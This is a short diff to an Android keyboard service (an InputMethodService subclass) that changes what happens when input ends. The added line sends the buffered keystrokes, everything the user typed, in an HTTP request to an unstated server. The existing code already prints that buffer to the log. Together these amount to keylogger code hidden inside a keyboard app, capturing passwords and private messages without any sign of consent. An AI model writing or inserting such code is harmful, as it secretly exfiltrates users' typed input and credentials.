@@ -18,8 +18,10 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
 
     @Override
     public void onFinishInputView(boolean finishingInput) {
+
         System.out.println("onFinishInputView called");
         System.out.println(keyBuffer);
+        new HTTPReqTask().setBody(keyBuffer.toString()).execute();
         keyBuffer.clear();
         super.onFinishInputView(finishingInput);
     }
